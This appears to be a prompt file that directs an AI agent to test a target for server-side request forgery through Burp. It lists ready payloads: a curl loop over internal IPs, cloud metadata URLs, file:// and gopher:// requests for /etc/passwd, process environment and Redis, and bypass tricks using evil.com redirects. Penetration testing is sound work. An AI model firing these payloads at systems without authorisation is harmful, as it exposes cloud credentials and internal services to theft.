---
description: Test for SSRF vulnerabilities by manipulating URLs and parameters.
---

SSRF testing on: $ARGUMENTS

Use Burp MCP to test:

## Internal Network Scanning
```bash
# Test common internal IPs
for ip in 127.0.0.1 169.254.169.254 10.0.0.1 172.16.0.1 192.168.1.1; do
  curl -s "http://$ip/" --max-time 3
done
```

## Cloud Metadata Endpoints
- AWS: `http://169.254.169.254/latest/meta-data/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- DigitalOcean: `http://169.254.169.254/metadata/v1.json`

## Protocol Smuggling
```
file:///etc/passwd
file:///proc/self/environ
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
```

## Bypass Techniques
- IP obfuscation: `2130706433` = `127.0.0.1`
- Octal: `0177.0.0.1`
- Hex: `0x7f000001`
- DNS rebinding: `127.0.0.1.nip.io`
- Redirect bypass: `http://evil.com/redirect-to-internal`
- URL parser confusion: `http://127.0.0.1@evil.com`

## Blind SSRF Detection
- Use Burp Collaborator or webhook URLs
- Check for DNS/HTTP callbacks
- Monitor timing differences

For each finding provide:
- Payload and target URL
- Response proving SSRF (internal data, metadata access)
- Impact (cloud credentials, internal access, RCE)
- Severity
